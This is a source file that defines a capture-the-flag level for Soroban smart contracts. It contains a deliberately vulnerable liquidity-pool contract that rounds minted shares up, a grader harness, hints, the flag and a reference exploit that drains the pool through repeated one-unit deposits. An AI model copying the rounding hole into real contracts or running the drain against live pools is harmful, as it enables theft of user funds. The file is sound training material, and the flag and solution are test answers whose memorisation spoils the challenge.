import "server-only";

import type { CtfLevel } from "../types";
import { LIB_RS, cargoToml } from "./shared";

// Level 05 — THE DUST MILL.
//
// Class: rounding that favours the caller (Stellar Security Portal: "Rounding
// on Division Allow Users to Withdraw Dust From Liquidity Pools", "Incorrect
// rounding enables an attacker to drain funds from the protocol"). `deposit`
// rounds the shares it mints UP, so a deposit of one unit is credited more
// than it is worth. One unit at a time that is dust; hundreds of times it is
// a hole in the pool.
//
// Harness: every call may be signed. `redeem` pays only the account that
// owns the shares, so acting for the victim gains nothing; the win condition
// is the attacker's wallet growing past what it started with.

const LEVEL_RS = `//! The Dust Mill of Saint Stroop — a pool that grinds deposits into shares.
//!
//! The pool already holds more than its shares say. Follow the rounding.

#![allow(dead_code)]

use soroban_sdk::{contract, contractimpl, contracttype, Address, Env};

/// What the pool holds, and the shares the victim owns of it: each share is
/// worth 1.5 units.
const POOL: i128 = 1_500;
const SHARES: i128 = 1_000;
/// What the attacker carries into the mill.
const WALLET: i128 = 1_000;

#[contracttype]
pub enum DataKey {
    TotalAssets,
    TotalShares,
    Shares(Address),
    Wallet(Address),
}

#[contract]
pub struct Mill;

#[contractimpl]
impl Mill {
    /// Runs once, at deployment: the victim owns the whole pool, the attacker
    /// owns a full wallet.
    pub fn __constructor(env: Env, victim: Address, attacker: Address) {
        let s = env.storage().instance();
        s.set(&DataKey::TotalAssets, &POOL);
        s.set(&DataKey::TotalShares, &SHARES);
        s.set(&DataKey::Shares(victim), &SHARES);
        s.set(&DataKey::Wallet(attacker), &WALLET);
    }

    /// Pay \`assets\` from \`from\`'s wallet into the pool. Returns the shares minted.
    pub fn deposit(env: Env, from: Address, assets: i128) -> i128 {
        from.require_auth();
        if assets <= 0 {
            panic!("amount must be positive");
        }
        let wallet = get(&env, &DataKey::Wallet(from.clone()));
        if wallet < assets {
            panic!("insufficient wallet");
        }

        let total_assets = get(&env, &DataKey::TotalAssets);
        let total_shares = get(&env, &DataKey::TotalShares);

        // Round UP, so a depositor is never shorted a fraction of a share.
        let shares = (assets * total_shares + total_assets - 1) / total_assets;

        put(&env, &DataKey::Wallet(from.clone()), wallet - assets);
        put(&env, &DataKey::TotalAssets, total_assets + assets);
        put(&env, &DataKey::TotalShares, total_shares + shares);
        let owned = get(&env, &DataKey::Shares(from.clone()));
        put(&env, &DataKey::Shares(from), owned + shares);
        shares
    }

    /// Burn \`shares\` and pay their worth into \`from\`'s wallet. Returns the assets paid.
    pub fn redeem(env: Env, from: Address, shares: i128) -> i128 {
        from.require_auth();
        if shares <= 0 {
            panic!("amount must be positive");
        }
        let owned = get(&env, &DataKey::Shares(from.clone()));
        if owned < shares {
            panic!("insufficient shares");
        }

        let total_assets = get(&env, &DataKey::TotalAssets);
        let total_shares = get(&env, &DataKey::TotalShares);

        // Round down, as a payout should.
        let assets = shares * total_assets / total_shares;

        put(&env, &DataKey::Shares(from.clone()), owned - shares);
        put(&env, &DataKey::TotalShares, total_shares - shares);
        put(&env, &DataKey::TotalAssets, total_assets - assets);
        let wallet = get(&env, &DataKey::Wallet(from.clone()));
        put(&env, &DataKey::Wallet(from), wallet + assets);
        assets
    }

    /// Public views.
    pub fn wallet_of(env: Env, who: Address) -> i128 {
        get(&env, &DataKey::Wallet(who))
    }

    pub fn shares_of(env: Env, who: Address) -> i128 {
        get(&env, &DataKey::Shares(who))
    }

    pub fn total_assets(env: Env) -> i128 {
        get(&env, &DataKey::TotalAssets)
    }

    pub fn total_shares(env: Env) -> i128 {
        get(&env, &DataKey::TotalShares)
    }
}

fn get(env: &Env, key: &DataKey) -> i128 {
    env.storage().instance().get::<DataKey, i128>(key).unwrap_or(0)
}

fn put(env: &Env, key: &DataKey, value: i128) {
    env.storage().instance().set(key, &value);
}
`;

const STARTER_RS = `// Only this file is yours to edit.
//
// The mill's pool holds 1,500 for 1,000 shares (1.5 per share), all owned by
// \`victim\`. \`attacker\` walks in with a wallet of 1,000. The grader lets every
// call be signed, then checks that \`attacker\`'s wallet grew by at least 100.
//
// The signature is fixed: change the body, not the parameters.
use soroban_sdk::{Address, Env};

use crate::level::MillClient;

pub fn solve(env: &Env, vault: Address, victim: Address, attacker: Address) {
    let _ = (env, vault, victim, attacker);
    // TODO: deposit() rounds the shares it mints UP. What does a deposit of 1 unit buy?
}
`;

const HARNESS = `// Hidden grader — never sent to the browser.
//
// The victim owns the whole pool; the attacker has a full wallet and every
// call is signed. redeem() pays only the account that owns the shares, so
// acting for the victim gains nothing. The only way to leave with more than
// 1,100 is to profit from the rounding.
use dust_mill::exploit;
use dust_mill::level::{Mill, MillClient};
use soroban_sdk::testutils::Address as _;
use soroban_sdk::{Address, Env};

#[test]
fn ctf_win() {
    let env = Env::default();
    let victim = Address::generate(&env);
    let attacker = Address::generate(&env);

    let mill_id = env.register(Mill, (victim.clone(), attacker.clone()));
    let client = MillClient::new(&env, &mill_id);

    assert_eq!(client.total_assets(), 1_500, "setup failed");
    assert_eq!(client.total_shares(), 1_000, "setup failed");
    assert_eq!(client.wallet_of(&attacker), 1_000, "setup failed");

    env.mock_all_auths();
    exploit::solve(&env, mill_id.clone(), victim.clone(), attacker.clone());

    assert!(
        client.wallet_of(&attacker) >= 1_100,
        "the attacker did not take at least 100 out of the pool"
    );

    // Last statement, reached only when every assertion above held. The nonce
    // is minted per run by the server and exists nowhere the exploit can read.
    println!("CTF_WIN __CTF_NONCE__");
}
`;

const REFERENCE_RS = `use soroban_sdk::{Address, Env};

use crate::level::MillClient;

pub fn solve(env: &Env, vault: Address, victim: Address, attacker: Address) {
    let _ = victim;
    let client = MillClient::new(env, &vault);
    // One unit buys a whole share (rounded up from 0.67) that redeems for 1.5.
    // Each deposit is dust; five hundred of them are a hole in the pool.
    let mut shares = 0;
    for _ in 0..500 {
        shares += client.deposit(&attacker, &1);
    }
    client.redeem(&attacker, &shares);
}
`;

export const dustMill: CtfLevel = {
  slug: "dust-mill",
  title: "The Dust Mill",
  tagline: "A pool that rounds in the depositor's favour, one unit at a time.",
  difficulty: "master",
  estMinutes: 25,
  story: `The Dust Mill of Saint Stroop grinds deposits into shares. The miller is generous: when the numbers do not divide evenly, he rounds in the customer's favour. It is a kindness. It costs a fraction of a coin.

A fraction of a coin, times a thousand customers, is a miller who is no longer rich.`,
  brief: `## The target

\`src/level.rs\` is a pool. \`deposit(from, assets)\` turns assets into shares; \`redeem(from, shares)\` turns shares back into assets. The pool holds **1,500** and has issued **1,000** shares, all owned by \`victim\`, so every share is worth 1.5.

## Your job

\`src/exploit.rs\` exports one function:

\`\`\`rust
pub fn solve(env: &Env, vault: Address, victim: Address, attacker: Address)
\`\`\`

\`attacker\` walks in with a wallet of **1,000**. The grader lets every call be signed, then checks that \`attacker\`'s wallet ended at **1,100 or more**: a profit of at least 100, taken from the pool.

## Rules

- You may edit **only** \`src/exploit.rs\`. \`Cargo.toml\`, \`src/lib.rs\` and \`src/level.rs\` are fixed by the level.
- Keep the \`solve\` signature exactly as written.
- \`redeem\` pays only the account that owns the shares. Acting for \`victim\` gains you nothing.

## Reading the ledger

\`wallet_of\`, \`shares_of\`, \`total_assets\` and \`total_shares\` are public views.`,
  hints: [
    "Compare the rounding in `deposit` with the rounding in `redeem`. Which one rounds up, and who does that favour?",
    "Depositing 1 unit mints `ceil(1 * 1000 / 1500)` = 1 whole share, which `redeem` values at 1.5. The gain is tiny, but it repeats.",
    "A lump sum does not help: the rounding only matters on small amounts. Deposit 1 unit many times, collect the shares, then redeem them all at once.",
  ],
  files: {
    "Cargo.toml": cargoToml("dust_mill"),
    "src/lib.rs": LIB_RS,
    "src/level.rs": LEVEL_RS,
  },
  starter: STARTER_RS,
  harness: HARNESS,
  winTest: "test ctf_win ... ok",
  forbid: ["storage"],
  flag: "TUSST{r0und_up_dr41ns_p00ls}",
  reference: REFERENCE_RS,
};
